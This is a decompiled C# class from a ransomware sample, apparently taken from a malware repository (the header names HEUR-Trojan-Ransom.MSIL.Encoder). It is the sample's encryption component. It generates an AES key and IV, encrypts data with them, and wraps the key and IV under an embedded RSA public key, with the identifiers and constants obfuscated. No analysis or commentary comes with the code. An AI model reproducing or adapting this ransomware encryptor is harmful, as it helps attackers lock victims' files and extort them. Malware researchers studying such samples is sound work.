// Decompiled with JetBrains decompiler
// Type: ivClqxOl
// Assembly: dorfler, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 17854846-16B6-4B16-9B03-D518D9EA03C7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.12-msil\HEUR-Trojan-Ransom.MSIL.Encoder.gen-f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789.exe

using System;
using System.IO;
using System.Security.Cryptography;

internal sealed class ivClqxOl
{
  private readonly byte[] EkUGhyiR;
  private readonly byte[] pLhnorVc;

  public ivClqxOl()
  {
    Aes aes = Aes.Create();
    aes.GenerateKey();
    aes.GenerateIV();
    this.EkUGhyiR = aes.Key;
    this.pLhnorVc = aes.IV;
  }

  public byte[] rVWZTCXX(byte[] SvyBqJJx)
  {
    using (Aes aes = Aes.Create())
    {
      aes.KeySize = 823386367 ^ 823386239;
      aes.BlockSize = 917713090 ^ 917712962;
      aes.Padding = PaddingMode.Zeros;
      aes.Key = this.EkUGhyiR;
      aes.IV = this.pLhnorVc;
      using (ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
        return this.vJpmCiXM(SvyBqJJx, encryptor);
    }
  }

  public byte[] fWdjkvZy(byte[] vrRRfzvg)
  {
    using (Aes aes = Aes.Create())
    {
      aes.KeySize = 775293052 ^ 775293180;
      aes.BlockSize = 36387152 ^ 36387280;
      aes.Padding = PaddingMode.Zeros;
      aes.Key = this.EkUGhyiR;
      aes.IV = this.pLhnorVc;
      using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
        return this.vJpmCiXM(vrRRfzvg, decryptor);
    }
  }

  private byte[] vJpmCiXM(byte[] OjuTSuMz, ICryptoTransform LegttFbV)
  {
    using (MemoryStream memoryStream = new MemoryStream())
    {
      using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, LegttFbV, CryptoStreamMode.Write))
      {
        cryptoStream.Write(OjuTSuMz, 0, OjuTSuMz.Length);
        cryptoStream.FlushFinalBlock();
        return memoryStream.ToArray();
      }
    }
  }

  public string PruZnHLM
  {
    get
    {
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider())
      {
        cryptoServiceProvider.ImportParameters(new RSAParameters()
        {
          Exponent = Convert.FromBase64String(oymxyeRJ.CajLqoCk("\u0017(\u0005\0", "VyDBLfRt")),
          Modulus = Convert.FromBase64String(oymxyeRJ.CajLqoCk("6#\u001F~&,c?=\u00154%\"\u00134=-@<?2;\u00145h\u001D<\n70\u001F<;@\u001E#\u0019\u001D>9\u001DD5\t[\u0019\u00144.J\u0013:\u0002+\fb<0#.7O\u001D\u0013\u0017\u0018\u0011c\fL\0\u0019#\u0006\u0003\u0010\u0015K'\a\u0017D!\u001C<\" \u0006\t\u0016\u0001%\u00107,\u001914Tq\u001C\u0011~\u001B28%\0@,:1\u0018\u0001?\u0005G-0\u0006\u000F7\"p=\u00123 b\u0012!\u0002#0,\u0010\u001B\"4-:,\u0010\u0002\u0011\0\u0015=\u0011\u001B\u0004\u0002\u0014\07\u001D\0\u001D\u0005|\u001FE3\u001A\u0006, fnXVu", "ZsfHtxUW"))
        });
        return Convert.ToBase64String(cryptoServiceProvider.Encrypt(this.EkUGhyiR, true)) + oymxyeRJ.CajLqoCk("zR[LOGf", "ZrvabgFb") + Convert.ToBase64String(cryptoServiceProvider.Encrypt(this.pLhnorVc, true));
      }
    }
  }
}
